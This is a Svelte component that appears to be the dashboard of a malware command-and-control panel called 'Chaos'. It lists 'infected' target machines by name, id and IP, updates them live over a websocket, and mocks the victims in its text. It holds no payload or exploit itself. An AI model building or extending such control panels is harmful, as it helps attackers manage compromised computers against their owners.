<script lang="ts">
  import { Api } from '../api';
  import type { Socket } from '../api';
  import Target from '../Target.svelte';
  import { onMount } from 'svelte';
  import { subscribe } from '../websocket';

  let targets: Socket[] = [];

  onMount(async () => {
    try {
      targets = [...targets, ...(await Api.targets())];

      subscribe((command) => {
        switch (command.name) {
          case 'targetAdd':
            targets = [...targets, command.data];
            break;
          case 'targetQuit':
            targets = targets.filter(
              (target) => target.id !== command.data?.id
            );
            break;
        }
      });
    } catch (err) {
      console.error(err);
    }
  });

</script>

<main>
  {#if targets.length > 0}
    <p>
      The <span class="target-count"
        >{targets.length === 1 ? 'only' : targets.length}</span
      >
      poor computer{targets.length === 1 ? '' : 's'} infected by Chaos 🔥. Too bad
      for
      {targets.length === 1 ? 'him' : 'them'}.
    </p>
  {/if}
  <div class="targets">
    {#each targets as target}
      <Target
        name={target.name}
        id={target.id}
        ip={target.ip}
        slot={target.id}
      />
    {/each}
  </div>
</main>

<style>
  .targets {
    margin: 4rem 2rem;
  }

  .target-count {
    color: var(--main-1);

    font-weight: bold;
  }

</style>
